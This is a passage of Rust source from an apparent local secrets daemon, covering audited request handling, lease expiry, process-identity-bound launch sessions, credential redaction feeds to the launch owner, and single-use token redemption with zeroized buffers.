        Req::SourceAdd { .. } => Some("daemon-source-add"),
        Req::SourceRemove { .. } => Some("daemon-source-remove"),
        Req::SourceRetarget { .. } => Some("daemon-source-retarget"),
        Req::Add { .. } => Some("daemon-add"),
        Req::ChangePolicy { .. } => Some("daemon-policy"),
        Req::Delete { .. } => Some("daemon-delete"),
        Req::ChangeConfig { .. } => Some("daemon-config"),
        Req::Recover { .. } => Some("daemon-recover"),
        Req::RecoverFromPaper { .. } => Some("daemon-recover-from-paper"),
        Req::RetireKeys | Req::RetireKeysWithPaper { .. } => Some("daemon-retire-keys"),
        Req::RotateBackup { .. } => Some("daemon-backup-rotate"),
        Req::UpgradeKeys => Some("daemon-keys-upgrade"),
        Req::SsoPortalAdd { .. } => Some("daemon-sso-portal"),
        Req::RefreshSsoRegistrations { .. } => Some("daemon-sso-refresh-registrations"),
        Req::CompleteSsoLogin { .. } => Some("daemon-sso-login-complete"),
        Req::Copy { .. } => Some("daemon-copy"),
        Req::Unlock { .. } => Some("daemon-unlock"),
        Req::RunUnredacted { .. } => Some("daemon-run-unredacted"),
        Req::Init { .. } => Some("daemon-init"),
        Req::HelperPin { .. } => Some("daemon-helper-pin"),
        Req::PubKeys => Some("daemon-pubkeys"),
        Req::StatusSelftest => Some("daemon-status-selftest"),
        Req::Grant { .. } | Req::GrantLease { .. } => Some("daemon-grant"),
        Req::HumanUnlock { .. } => Some("daemon-human-unlock"),
        Req::Use { .. } => Some("daemon-use"),
        Req::AwsOpen { .. } => Some("daemon-aws-open"),
        Req::SsoOpen { .. } => Some("daemon-sso-open"),
        Req::SsoSet { .. } => Some("daemon-sso-set"),
        Req::SsoRegister { .. } => Some("daemon-sso-register"),
        Req::SsoImport { .. } => Some("daemon-sso-import"),
        Req::SsoDiscover { .. } | Req::SsoImportPreview { .. } => Some("daemon-sso-discover"),
        _ => None,
    };
    let containment = match &req {
        Req::Revoke { .. } => Some("daemon-revoke"),
        Req::AwsClose { .. } => Some("daemon-aws-close"),
        Req::SsoForget { .. } => Some("daemon-sso-forget"),
        Req::SsoLogout { .. } => Some("daemon-sso-logout"),
        Req::Shutdown => Some("daemon-stop"),
        _ => None,
    };
    let names: Vec<String> = match &req {
        Req::SsoImport { items, .. } => items.iter().map(|i| format!("aws/{}", i.name)).collect(),
        Req::SourceAdd { name, .. } | Req::SourceRemove { name } | Req::SourceRetarget { name, .. }
        | Req::Add { name, .. } | Req::Copy { name } => vec![name.clone()],
        Req::ChangePolicy { patterns, .. } | Req::Delete { patterns } => patterns.clone(),
        Req::Grant { leases } => leases.iter().map(|l| l.name.clone()).collect(),
        Req::Unlock { names, .. } | Req::Use { names, .. } | Req::HumanUnlock { names } | Req::GrantLease { names, .. } => names.clone(),
        Req::AwsOpen { profile, .. } => vec![profile.clone()],
        Req::SsoOpen { name, .. } => vec![name.clone()],
        Req::SsoRegister { profiles } | Req::SsoSet { profiles, .. } => profiles.iter().map(|r| r.name.clone()).collect(),
        _ => vec![],
    };
    let import_count = matches!(&req, Req::SsoImport { .. }).then_some(names.len());
    let caller = peer.caller.clone();
    let anchor = peer.human_anchor();
    let sso_open = matches!(&req, Req::SsoOpen { .. });
    let unlock = matches!(&req, Req::Unlock { .. });
    let operation = || {
        let response = handle_effect(p, st, peer, req, http_port)?;
        if sso_open {
            #[cfg(test)]
            sso_test_checkpoint("open-delivery");
            // Delivery linearizes here. Never hold state across socket writes.
            st.lock().unwrap().check_endpoint(response["id"].as_str().context("missing endpoint")?)?;
        }
        if unlock && let Some(endpoint) = response.get("endpoint").filter(|v| !v.is_null()) {
            st.lock().unwrap().check_endpoint(endpoint["id"].as_str().context("missing endpoint")?)?;
        }
        check_agent_access(p, st, &caller)?;
        deliver(response)
    };
    if let Some(action) = action {
        crate::audit::run(p, action, &names, &caller, json!({"peer_pid": peer_pid, "anchor": anchor, "untrusted_client_parent": client_parent, "import_count": import_count}), operation)
    } else if let Some(action) = containment {
        crate::audit::containment(p, action, &caller, operation)
    } else { operation() }
}

fn check_agent_access(p: &Paths, st: &Mutex<State>, caller: &agent::Caller) -> Result<()> {
    crate::policy::check_killed(p, caller)?;
    if st.lock().unwrap().killed.matches(caller) { bail!("policy.killed"); }
    Ok(())
}

fn check_lease_snapshot(p: &Paths, state: &State, revision: u64, files: &[store::SecretFile]) -> Result<()> {
    if state.lease_revision != revision { bail!("leases revoked during approval; retry"); }
    for f in files {
        if serde_json::to_value(store::load_secret(p, &f.name)?)? != serde_json::to_value(f)? {
            bail!("secret changed during approval; retry");
        }
    }
    Ok(())
}

/// Timer containment, separated from the screen-lock/helper probe for testing.
fn expire_leases(p: &Paths, st: &Mutex<State>, t: u64) -> bool {
    let (gone, human_expired, has_human, launches) = {
        let mut g = st.lock().unwrap();
        let gone: Vec<String> = g.leases.iter().filter(|(_, h)| h.info.expires <= t).map(|(n, _)| n.clone()).collect();
        for n in &gone { g.leases.remove(n); }
        let he: Vec<_> = g.human.iter().filter(|(_, h)| h.info.expires <= t).map(|(n, _)| n.clone()).collect();
        for n in &he { g.human.remove(n); }
        g.aws.retain(|_, e| e.expires > Instant::now());
        let launches = g.pending_launches.burn_pending_matching(&gone);
        g.reconcile_launch_endpoints();
        (gone, he.into_iter().map(|(_, _, name)| name).collect::<Vec<_>>(), !g.human.is_empty(), launches)
    };
    audit_contained_launches(p, "launch-lease-expired", launches);
    audit_bound_containment(p, st);
    if !gone.is_empty() { log_event(p, "lease-expired", &gone, json!({})); }
    if !human_expired.is_empty() { log_event(p, "lease-expired", &human_expired, json!({"to": "you (human)"})); }
    has_human
}

fn audit_bound_containment(p: &Paths, st: &Mutex<State>) {
    let burned = {
        let mut g = st.lock().unwrap();
        g.reconcile_launch_endpoints();
        g.pending_launches.drain_contained()
    };
    for refs in burned {
        log_event(p, "launch-bound-contained", &refs, json!({"kind":"containment", "exemption":"containment"}));
    }
}

/// Socket-local authority. Removing State metadata invalidates it even while this
/// guard still owns its token. Redeem atomically takes BOTH before validation.
struct BoundSession<'a> {
    p: &'a Paths,
    st: &'a Ctx,
    id: String,
    _token: Option<Zeroizing<[u8; 32]>>,
    _shim: agent::ProcessIdentity,
    taken: Option<crate::launch::TakenLaunch>,
    endpoint: Option<(String, Instant)>,
    http_port: u16,
}
impl Drop for BoundSession<'_> {
    fn drop(&mut self) {
        // Test-only: delay EOF containment so the redaction take's fresh kernel
        // recheck is the sole refusal under test (hold-bound-drop file).
        #[cfg(test)]
        while run_dir(self.p).join("hold-bound-drop").exists() { std::thread::sleep(Duration::from_millis(5)); }
        {
            let mut g = self.st.lock().unwrap();
            if let Some((id, _)) = &self.endpoint { g.aws.remove(id); }
            g.pending_launches.burn_bound(&self.id);
            g.reconcile_launch_endpoints();
        }
        audit_bound_containment(self.p, self.st);
    }
}

#[cfg(test)]
type CliRequestObserver = Box<dyn Fn(&Req)>;
#[cfg(test)]
type CliRedeemObserver = Box<dyn FnOnce(&[u8])>;
#[cfg(test)]
type LaunchBindHook = Box<dyn FnMut(&str) -> Result<()>>;
#[cfg(test)]
type LaunchOwnerHook = Box<dyn Fn(agent::Peer) -> agent::Peer>;
#[cfg(test)]
thread_local! {
    static CLI_REQUEST_OBSERVER: std::cell::RefCell<Option<CliRequestObserver>> = const { std::cell::RefCell::new(None) };
    static CLI_REDEEM_OBSERVER: std::cell::RefCell<Option<CliRedeemObserver>> = const { std::cell::RefCell::new(None) };
    static LAUNCH_OWNER_HOOK: std::cell::RefCell<Option<LaunchOwnerHook>> = const { std::cell::RefCell::new(None) };
    static LAUNCH_BIND_HOOK: std::cell::RefCell<Option<LaunchBindHook>> = const { std::cell::RefCell::new(None) };
}
fn bind_external_work(_stage: &str) -> Result<()> {
    #[cfg(test)]
    LAUNCH_BIND_HOOK.with(|h| { if let Some(hook) = h.borrow_mut().as_mut() { hook(_stage) } else { Ok(()) } })?;
    Ok(())
}

fn bind_session<'a>(p: &'a Paths, st: &'a Ctx, c: &UnixStream, peer_pid: i32, id: &str) -> Result<BoundSession<'a>> {
    use rand::RngCore;
    expire_launches(p, st, now());
    let full_argv = store::load_config(p)?.audit_full_argv;
    let (owner, mut detail, refs) = st.lock().unwrap().pending_launches.bind_snapshot(id, now(), full_argv)?;
    bind_external_work("kernel")?;
    let pid = crate::platform::bound_peer_pid(c, peer_pid)?;
    let shim = agent::process_identity(pid)?;
    if agent::process_parent_identity(shim)? != owner { bail!("launch refused"); }
    bind_external_work("hash")?;
    let exe = std::fs::canonicalize(agent::proc_exe(pid).context("launch refused")?)?;
    let pins = std::fs::read_to_string(p.keys().join("daemon.sha256"))?;
    let hash = crate::platform::helper::sha256_file(&exe)?;
    if !pins.lines().any(|pin| pin.trim() == hash) { bail!("launch refused"); }
    bind_external_work("rng")?;
    let mut token = Zeroizing::new([0u8; 32]);
    rand::rngs::OsRng.try_fill_bytes(token.as_mut())?;
    let identity = |i: agent::ProcessIdentity| json!({"pid":i.pid,"sec":i.sec,"usec":i.usec});
    detail["owner"] = identity(owner);
    detail["shim"] = identity(shim);
    let caller = agent::Caller { pid: Some(pid), ..Default::default() };
    bind_external_work("audit")?;
    crate::audit::run(p, "launch-bind", &refs, &caller, detail, || {
        // Recheck after hashing/RNG/intent; no kernel or filesystem work under State.
        bind_external_work("recheck")?;
        if agent::process_identity(pid)? != shim || agent::process_parent_identity(shim)? != owner
            || std::fs::canonicalize(agent::proc_exe(pid).context("launch refused")?)? != exe { bail!("launch refused"); }
        let taken = st.lock().unwrap().pending_launches.bind(id, owner, shim, now())?;
        Ok(BoundSession { p, st, id: id.into(), _token: Some(token), _shim: shim, taken: Some(taken), endpoint: None, http_port: 0 })
    })
}

/// Exact kernel owner identity, never a claimed pid or shim possession of an id.
/// `version` is the socket's audit-token pidversion: the request is honoured only
/// if that exact process incarnation is still alive as the registry owner, both
/// before audit intent and again (fresh kernel reads, outside State) after it.
/// Returns the owner and shim identities when the frame announced later updates.
fn release_launch_redaction(p: &Paths, st: &Mutex<State>, pid: i32, version: u32, id: &str, c: &mut UnixStream) -> Result<Option<(agent::ProcessIdentity, agent::ProcessIdentity)>> {
    expire_launches(p, st, now());
    if live_pidversion(pid)? != version { bail!("launch refused"); }
    let owner = agent::process_identity(pid)?;
    let (shim, caller) = {
        let g = st.lock().unwrap();
        let r = g.launch_redactions.get(id).context("launch refused")?;
        if r.owner != owner || now() >= r.expires_at || !g.pending_launches.redaction_live(id, owner, r.shim, now()) { bail!("launch refused"); }
        (r.shim, r.caller.clone())
    };
    check_agent_access(p, st, &caller)?;
    bind_external_work("redaction-audit")?;
    let feed_inserted = std::cell::Cell::new(false);
    crate::audit::run(p, "launch-redaction", &[], &caller,
        json!({"id":id,"owner":{"pid":owner.pid,"sec":owner.sec,"usec":owner.usec}}), || {
        bind_external_work("redaction-take")?;
        // Audit may block: re-verify the socket's incarnation, owner and shim
        // liveness with fresh kernel reads before the guarded single-use take.
        if live_pidversion(pid)? != version || agent::process_identity(pid)? != owner
            || agent::process_identity(shim.pid)? != shim || agent::process_parent_identity(shim)? != owner { bail!("launch refused"); }
        let (frame, updates) = {
            let mut g = st.lock().unwrap();
            let r = g.launch_redactions.get(id).context("launch refused")?;
            if r.owner != owner || now() >= r.expires_at || !g.pending_launches.redaction_live(id, owner, r.shim, now()) { bail!("launch refused"); }
            let r = g.launch_redactions.remove(id).context("launch refused")?;
            // Same critical section as the take: no fetch can see the owner as absent.
            if r.updates { g.redaction_feeds.insert(id.into(), RedactionFeed::default()); feed_inserted.set(true); }
            (r.frame, r.updates)
        };
        c.set_write_timeout(Some(Duration::from_secs(10)))?;
        check_agent_access(p, st, &caller)?;
        c.write_all(&frame)?;
        Ok(updates)
    }).inspect_err(|_| if feed_inserted.get() { st.lock().unwrap().redaction_feeds.remove(id); }).map(|updates| updates.then_some((owner, shim)))
}

/// Pushes minted role credentials to the launch owner's redactor and collects its
/// acknowledgements. When the launch ends, or the owner stops answering, the launch is
/// contained: nothing could redact for it any more, so its endpoint must not serve.
/// Ending is final, so this also returns normally when the launch is no longer live.
fn serve_redaction_feed(p: &Paths, st: &Mutex<State>, c: &mut UnixStream, id: &str, live: &dyn Fn(&State) -> bool) {
    #[derive(Deserialize)]
    #[serde(deny_unknown_fields)]
    struct Ack { ack: u64 }
    #[derive(Serialize)]
    struct Update<'a> { seq: u64, values: Vec<(&'a str, &'a str)> }
    // Every exit (owner gone, bad ack, launch over) ends the launch the same way.
    let _ = (|| -> Result<()> {
        c.set_write_timeout(Some(Duration::from_secs(REDACTION_ACK_WAIT.as_secs())))?;
        // Short reads double as the poll interval for newly queued updates.
        c.set_read_timeout(Some(Duration::from_millis(20)))?;
        let (mut line, mut swept) = (Vec::new(), Instant::now());
        loop {
            if swept.elapsed() >= Duration::from_millis(250) { expire_launches(p, st, now()); swept = Instant::now(); }
            let outgoing = {
                let mut g = st.lock().unwrap();
                if !live(&g) { return Ok(()); }
                let feed = g.redaction_feeds.get_mut(id).context("redaction feed ended")?;
                feed.queue.iter_mut().filter(|u| !u.sent).map(|u| {
                    u.sent = true;
                    launch_frame(&Update { seq: u.seq, values: u.values.iter().map(|(n, v)| (n.as_str(), v.as_str())).collect() })
                }).collect::<Result<Vec<_>>>()?
            };
            for frame in outgoing { c.write_all(&frame)?; }
            let mut chunk = [0u8; 256];
            match c.read(&mut chunk) {
                Ok(0) => bail!("owner closed the redaction feed"),
                Ok(n) => line.extend_from_slice(&chunk[..n]),
                Err(e) if matches!(e.kind(), std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut) => (),
                Err(e) => return Err(e.into()),
            }
            while let Some(end) = line.iter().position(|b| *b == b'\n') {
                let ack: Ack = serde_json::from_slice(&line[..end])?;
                line.drain(..=end);
                let mut g = st.lock().unwrap();
                let feed = g.redaction_feeds.get_mut(id).context("redaction feed ended")?;
                if let Some(i) = feed.queue.iter().position(|u| u.seq == ack.ack && u.sent) {
                    let update = feed.queue.remove(i);
                    feed.acked.insert(update.hash);
                }
            }
            if line.len() > 1024 { bail!("redaction acknowledgement too long"); }
        }
    })();
    {
        let mut g = st.lock().unwrap();
        g.redaction_feeds.remove(id);
        // Whether the owner left or the launch ended, no filter remains: the endpoint dies too.
        g.pending_launches.burn_bound(id);
        g.reconcile_launch_endpoints();
    }
    audit_bound_containment(p, st);
}

/// Queue this endpoint's role credentials for its launch owner's redactor and wait (bounded)
/// until the owner acknowledged them.
fn redact_before_serving(st: &Mutex<State>, launch: &str, profile: &str, creds: &AwsCreds) -> Result<()> {
    let values = creds.secret_parts().into_iter()
        .map(|(part, value)| Ok((format!("{profile}:{part}"), Zeroizing::new(std::str::from_utf8(value)?.to_owned()))))
        .collect::<Result<Vec<_>>>()?;
    let joined: Zeroizing<Vec<u8>> = Zeroizing::new(values.iter().flat_map(|(n, v)| n.bytes().chain([0]).chain(v.bytes()).chain([0])).collect());
    let hash = crate::sso::sha256_hex(&joined);
    {
        let mut g = st.lock().unwrap();
        let Some(feed) = g.redaction_feeds.get_mut(launch) else {
            // Frame not yet taken: the owner's redactor is not up, and the target starts only
            // after it is, so nothing can fetch yet. Frame gone and feed gone: the owner left,
            // so serve nothing. A deliberate --no-redact launch never gets here: serve_aws
            // checks the endpoint's own `unredacted` flag, which outlives the prepare window.
            if g.launch_redactions.contains_key(launch) { return Ok(()); }
            bail!("redaction feed ended");
        };
        if feed.acked.contains(&hash) { return Ok(()); }
        if !feed.queue.iter().any(|u| u.hash == hash) {
            feed.next += 1;
            let seq = feed.next;
            feed.queue.push(FeedUpdate { seq, hash: hash.clone(), values, sent: false });
        }
    }
    let until = Instant::now() + REDACTION_ACK_WAIT;
    loop {
        match st.lock().unwrap().redaction_feeds.get(launch) {
            None => bail!("redaction feed ended"),
            Some(feed) if feed.acked.contains(&hash) => return Ok(()),
            Some(_) => (),
        }
        if Instant::now() >= until { bail!("owner did not acknowledge redaction in time"); }
        std::thread::sleep(Duration::from_millis(10));
    }
}

// Serialize borrowed values without a serde Value or a reallocating plaintext buffer.
fn launch_frame(value: &impl Serialize) -> Result<Zeroizing<Vec<u8>>> {
    struct Count(usize);
    impl Write for Count {
        fn write(&mut self, b: &[u8]) -> std::io::Result<usize> { self.0 += b.len(); Ok(b.len()) }
        fn flush(&mut self) -> std::io::Result<()> { Ok(()) }
    }
    let mut count = Count(0);
    serde_json::to_writer(&mut count, value)?;
    if count.0 >= 1024 * 1024 { bail!("launch frame too large"); }
    let mut line = Zeroizing::new(Vec::with_capacity(count.0 + 1));
    serde_json::to_writer(&mut *line, value)?;
    line.push(b'\n');
    Ok(line)
}

/// Prefix of the one prepare-time refusal whose text the owner is allowed to see.
pub(crate) const LAUNCH_TOO_LARGE: &str = "launch too large";
/// Daemon-to-shim frames are refused at this size (see `launch_frame`).
const LAUNCH_FRAME_LIMIT: usize = 1024 * 1024;
/// Room for what the shim adds itself (KARAMBIT_INJECTED, AWS variables) and for the exec path.
const EXEC_MARGIN: usize = 16 * 1024;

/// The kernel's limit on arguments plus environment for one exec.
fn exec_arg_max() -> usize {
    match unsafe { libc::sysconf(libc::_SC_ARG_MAX) } { n if n > 0 => n as usize, _ => LAUNCH_FRAME_LIMIT }
}

/// Decrypted length without decrypting: base64 of ciphertext = plaintext + 16-byte AEAD tag.
/// Ignores padding, so it is an upper bound.
fn plaintext_upper_bound(file: &store::SecretFile) -> usize {
    (file.ct.len() / 4 * 3).saturating_sub(16)
}

/// Refuse at prepare when the release is certain not to fit the 1 MB launch frame or the
/// kernel's ARG_MAX. Sizes come from ciphertext lengths, so only local secrets count:
/// backend (linked source) values are unknown until release and are checked there.
/// JSON escaping can still grow a value past this estimate; the release-time frame check stays.
fn check_launch_size(files: &[store::SecretFile], env: &std::collections::BTreeMap<String, String>, aws: Option<&str>,
    binding: &crate::launch::LaunchBinding, ambient_bytes: u64, arg_max: usize) -> Result<()> {
    let value_len = |reference: &String| files.iter().find(|f| &f.name == reference).map_or(0, plaintext_upper_bound);
    let pointer = std::mem::size_of::<usize>();
    let argv: usize = binding.argv().iter().map(|a| a.len() + 1 + pointer).sum();
    let cwd = binding.cwd().as_os_str().len();
    // NAME=value\0 plus its envp slot.
    let env_exec: usize = env.iter().map(|(k, r)| k.len() + 1 + value_len(r) + 1 + pointer).sum();
    // ambient_bytes comes from the client: an overflow is "too large", never a wrap.
    let exec = argv.saturating_add(env_exec).saturating_add(usize::try_from(ambient_bytes).unwrap_or(usize::MAX)).saturating_add(2 * pointer);
    let exec_limit = arg_max.saturating_sub(EXEC_MARGIN);
    if exec > exec_limit {
        bail!("{LAUNCH_TOO_LARGE}: its arguments and environment need about {exec} bytes but this system allows about {exec_limit} (ARG_MAX {arg_max}); \
            nothing was prompted or used. Put big values in a file the program reads instead of an environment variable");
    }
    // Bundle frame: env entries + argv + cwd + target binding (path + hash) + AWS fields and JSON keys.
    let bundle: usize = env.iter().map(|(k, r)| k.len() + value_len(r) + 6).sum::<usize>()
        + binding.argv().iter().map(|a| a.len() + 3).sum::<usize>() + 2 * cwd + 1024 + if aws.is_some() { 2048 } else { 0 };
    // Redaction frame: every distinct non-public secret once, by name.
    let redaction: usize = files.iter().filter(|f| !f.is_public() && Some(f.name.as_str()) != aws)
        .map(|f| f.name.len() + plaintext_upper_bound(f) + 6).sum::<usize>() + 64;
    let frame = bundle.max(redaction);
    if frame >= LAUNCH_FRAME_LIMIT {
        bail!("{LAUNCH_TOO_LARGE}: the secrets and arguments need about {frame} bytes but one launch is limited to {LAUNCH_FRAME_LIMIT}; \
            nothing was prompted or used. Put big values in a file the program reads instead of an environment variable");
    }
    Ok(())
}

/// Remaining lifetime until an absolute UNIX-seconds expiry, measured at full
/// SystemTime resolution so it never rounds up past the original deadline.
fn launch_remaining(expires_at: u64, at: std::time::SystemTime) -> Option<Duration> {
    let elapsed = at.duration_since(std::time::UNIX_EPOCH).ok()?;
    Duration::from_secs(expires_at).checked_sub(elapsed).filter(|d| !d.is_zero())
}

#[allow(clippy::too_many_arguments)]
fn serve_launch_bind(p: &Paths, st: &Ctx, c: &mut UnixStream, reader: &mut BufReader<UnixStream>, peer_pid: i32, id: &str, busy: InFlight, http_port: u16) {
    let result = (|| -> Result<()> {
        let mut session = bind_session(p, st, c, peer_pid, id)?;
        session.http_port = http_port;
        let session_owner = session.taken.as_ref().context("launch refused")?.owner;
        let remaining = launch_remaining(session.taken.as_ref().context("launch refused")?.expires_at, std::time::SystemTime::now()).context("launch refused")?;
        let deadline = Instant::now() + remaining;
        c.set_write_timeout(Some(remaining))?;
        {
            // No serde Value/String copy of the token; encoded copies are zeroized
            // as soon as this scope ends (after write, or on write failure).
            let encoded = Zeroizing::new(B64.encode(session._token.as_ref().context("launch refused")?.as_ref()));
            let line = Zeroizing::new(format!("{{\"token\":\"{}\"}}\n", encoded.as_str()));
            c.write_all(line.as_bytes())?;
        }
        st.lock().unwrap().last_activity = Some(Instant::now());
        drop(busy); // Bound metadata, not an indefinitely held request, supplies liveness.
        // Fixed allocation avoids both unbounded lines and unwiped reallocations.
        // A valid token cannot be pipelined before Bind has returned it. Avoid
        // leaving a token copy in BufReader's non-zeroizing read-ahead storage.
        if !reader.buffer().is_empty() { bail!("launch refused"); }
        let mut frame = Zeroizing::new([0u8; 4096]);
        let mut used = 0;
        loop {
            c.set_read_timeout(Some(deadline.checked_duration_since(Instant::now()).context("launch refused")?))?;
            if used == frame.len() { bail!("launch refused"); }
            reader.get_mut().read_exact(&mut frame[used..used+1])?;
            used += 1;
            if frame[used-1] == b'\n' { break; }
        }
        {
            let _busy = InFlight::enter();
            redeem_launch(&mut session, &frame[..used], deadline, c)?;
            #[cfg(test)]
            CLI_REDEEM_OBSERVER.with(|h| { if let Some(hook) = h.borrow_mut().take() { hook(&frame[..used]); } });
        }
        // AWS-only lifetime socket: no further protocol operations are accepted.
        // Timed blocking reads allow containment on another connection to close
        // this session without storing socket handles or doing I/O under State.
        if let Some((id, expires)) = &session.endpoint {
            loop {
                audit_bound_containment(p, st);
                if !st.lock().unwrap().aws.contains_key(id) { break; }
                let Some(left) = expires.checked_duration_since(Instant::now()) else { break; };
                c.set_read_timeout(Some(left.min(Duration::from_millis(250))))?;
                let mut byte = [0];
                match c.read(&mut byte) {
                    Err(e) if matches!(e.kind(), std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut) => continue,
                    _ => break, // EOF, extra byte or error: contain, never process.
                }
            }
        }
        else {
            loop {
                expire_launches(p, st, now());
                if !st.lock().unwrap().pending_launches.redaction_live(&session.id, session_owner, session._shim, now()) { break; }
                let Some(left) = deadline.checked_duration_since(Instant::now()) else { break; };
                c.set_read_timeout(Some(left.min(Duration::from_millis(250))))?;
                let mut byte = [0];
                match c.read(&mut byte) {
                    Err(e) if matches!(e.kind(), std::io::ErrorKind::WouldBlock | std::io::ErrorKind::TimedOut) => continue,
                    _ => break,
                }
            }
        }
        Ok(())
    })();
    if result.is_err() {
        let _ = c.set_write_timeout(Some(Duration::from_millis(100)));
        let _ = write_response(c, &json!({"error":"launch refused"}));
    }
    let _ = c.shutdown(std::net::Shutdown::Both);
}

/// All potentially blocking identity, binding and policy work stays outside State.
fn launch_live_snapshot(p: &Paths, st: &Mutex<State>, owner: agent::ProcessIdentity,
    shim: agent::ProcessIdentity, launch: &crate::launch::PendingLaunch,
) -> Result<(store::Config, agent::Peer, Option<String>, Vec<store::SecretFile>)> {
    let cfg = store::load_config(p)?;
    let peer = agent::detect_peer(&cfg, owner.pid);
    #[cfg(test)]
    let peer = LAUNCH_OWNER_HOOK.with(|h| h.borrow().as_ref().map_or_else(|| peer.clone(), |hook| hook(peer.clone())));
    if agent::process_identity(owner.pid)? != owner
        || peer.caller.agent != launch.caller.agent || peer.caller.kind != launch.caller.kind
        || peer.caller.session != launch.caller.session || peer.caller.env_unknown != launch.caller.env_unknown {
        bail!("launch refused");
    }
    let cwd = peer.cwd_abs().map(|c| canon_dir(&c));
    bind_external_work("redeem-verify")?;
    launch.binding.verify_unchanged()?;
    // exec keeps pid and start time, so identity alone cannot see the owner replace
    // itself while the prompt waits: re-resolve and compare its executable.
    check_owner_exe(owner, &launch.owner_exe)?;
    // Final live identity check after potentially slow target hashing.
    if agent::process_identity(shim.pid)? != shim
        || agent::process_parent_identity(shim)? != owner { bail!("launch refused"); }
    bind_external_work("redeem-policy")?;
    check_agent_access(p, st, &peer.caller)?;
    launch_policy(p, &peer.caller, &launch.refs, &launch.allow_hosts)?;
    let files = launch_legacy_files(p, &cfg, &peer, &launch.refs)?;
    if launch.decisions.values().any(|d| *d == crate::RunAuthorization::HumanCached) {
        bind_external_work("redeem-cache")?;
        if !check_human_cache_screen(p, st) { bail!("launch refused"); }
        // The non-prompting screen probe can still block. Death must win before
        // finalization, just as it does during target verification.
        if agent::process_identity(shim.pid)? != shim
            || agent::process_parent_identity(shim)? != owner { bail!("launch refused"); }
    }
    Ok((cfg, peer, cwd, files))
}

/// The owner must still run the executable Prepare pinned: same canonical path and the
/// same file (dev, inode, size, SHA-256).
fn check_owner_exe(owner: agent::ProcessIdentity, recorded: &crate::lease::CommandSnapshot) -> Result<()> {
    let exe = kernel_exe(owner.pid).and_then(|path| std::fs::canonicalize(path).ok()).context("launch refused")?;
    let current = CommandBinding::snapshot_regular_file(&exe, false).ok().flatten().context("launch refused")?;
    if &current != recorded { bail!("launch refused"); }
    Ok(())
}

#[cfg(test)]
type LateWipeHook = Box<dyn FnOnce(&[crate::Dek])>;
#[cfg(test)]
type LaunchAuthSetup = Box<dyn FnOnce(&Prompt) + Send>;
#[cfg(test)]
thread_local! {
    static LAUNCH_LATE_WIPE: std::cell::RefCell<Option<LateWipeHook>> = const { std::cell::RefCell::new(None) };
    static LAUNCH_AUTH_SETUP: std::cell::RefCell<std::collections::VecDeque<LaunchAuthSetup>> = const { std::cell::RefCell::new(std::collections::VecDeque::new()) };
}

/// The worker owns no State/session authority. Every Bio DEK is Zeroizing, including
/// a late result returned by a disconnected send. Explicitly wipe late DEKs in the
/// worker before dropping them; no unwrapped key survives worker completion.
fn launch_fresh_auth(v: crate::Karambit, bio: Vec<store::SecretFile>, reason: Prompt, deadline: Instant) -> Result<Vec<crate::Dek>> {
    let remaining = deadline.checked_duration_since(Instant::now()).context("launch refused")?;
    let cap = LAUNCH_CAP.with(|slot| slot.borrow().clone()).context("launch refused")?;
    #[cfg(test)]
    let setup = LAUNCH_AUTH_SETUP.with(|h| h.borrow_mut().pop_front());
    let (tx, rx) = std::sync::mpsc::sync_channel(1);
    let busy = InFlight::enter();
    std::thread::Builder::new().name("launch-auth".into()).spawn(move || {
        let _busy = busy;
        LAUNCH_CAP.with(|slot| *slot.borrow_mut() = Some(cap));
        #[cfg(test)]
        if let Some(setup) = setup { setup(&reason); }
        let mut result = if bio.is_empty() {
            crate::platform::helper::auth(&reason).map(|()| vec![])
        } else { v.unwrap_deks_local(&bio, &reason) };
        if Instant::now() >= deadline {
            if let Ok(deks) = &mut result {
                use zeroize::Zeroize;
                for dek in deks.iter_mut() { dek.zeroize(); }
                #[cfg(test)]
                LAUNCH_LATE_WIPE.with(|h| { if let Some(h) = h.borrow_mut().take() { h(deks); } });
            }
            result = Err(anyhow!("launch refused"));
        }
        LAUNCH_CAP.with(|slot| slot.borrow_mut().take());
        let _ = tx.send(result);
    })?;
    let deks = rx.recv_timeout(remaining).map_err(|_| anyhow!("launch refused"))??;
    if Instant::now() >= deadline { bail!("launch refused"); }
    Ok(deks)
}

/// The sole release path for socket-local launch authority. Session and metadata
/// are consumed together before parsing/token/identity validation; never restored.
fn redeem_launch(session: &mut BoundSession<'_>, frame: &[u8], deadline: Instant, c: &mut UnixStream) -> Result<()> {
    use p256::elliptic_curve::subtle::ConstantTimeEq;
    let (taken, token) = {
        let mut g = session.st.lock().unwrap();
        let taken = session.taken.take().context("launch refused")?;
        let token = session._token.take().context("launch refused")?;
        g.pending_launches.redeem(&session.id, &taken, session._shim, now())?;
        (taken, token)
    };
    // Borrow the token from the zeroizing fixed frame: no serde-owned secret String.
    #[derive(Deserialize)]
    #[serde(tag = "op", rename_all = "snake_case", deny_unknown_fields)]
    enum Frame<'a> { LaunchRedeem { #[serde(borrow)] token: &'a str } }
    // JSON escapes make serde copy the decoded string into non-zeroizing scratch;
    // the shim never needs them, so refuse escaped frames before parsing.
    if frame.contains(&b'\\') { bail!("launch refused"); }
    let Frame::LaunchRedeem { token: supplied } = serde_json::from_slice(frame)?;
    let mut decoded = Zeroizing::new([0u8; 33]);
    let len = B64.decode_slice(supplied, decoded.as_mut()).map_err(|_| anyhow!("launch refused"))?;
    if len != 32 || !bool::from(token.as_ref().ct_eq(&decoded[..32])) { bail!("launch refused"); }
    drop(token);
    let launch = taken.launch;
    check_launch_sso(&session.st.lock().unwrap(), &launch)?;
    bind_external_work("redeem-kernel")?;
    if agent::process_identity(session._shim.pid)? != session._shim
        || agent::process_parent_identity(session._shim)? != taken.owner { bail!("launch refused"); }
    let (mut cfg, mut peer, mut cwd, mut files) = launch_live_snapshot(session.p, session.st, taken.owner, session._shim, &launch)?;
    let sso = launch_sso(session.st, launch.aws.as_ref(), &peer)?;
    if sso.as_ref().map(|(_, b)| b) != launch.sso_binding.as_ref()
        || sso.as_ref().is_some_and(|(reg, _)| reg.tier == store::Tier::Open && !reg.agent_allowed) != launch.sso_use { bail!("launch refused"); }
    let policy_approval = launch_policy(session.p, &peer.caller, &launch.refs, &launch.allow_hosts)?;
    let approval_hash = launch_approval_hash(&launch, taken.owner)?;
    let mut proof = None;
    let mut fresh_deks = std::collections::BTreeMap::new();
    if policy_approval || launch.sso_use || launch.decisions.values().any(|d| *d == crate::RunAuthorization::NeedsFreshAuth) {
        {
            let g = session.st.lock().unwrap();
            g.pending_launches.check_redeeming(&session.id, taken.owner, taken.created_at, taken.expires_at, session._shim, now())?;
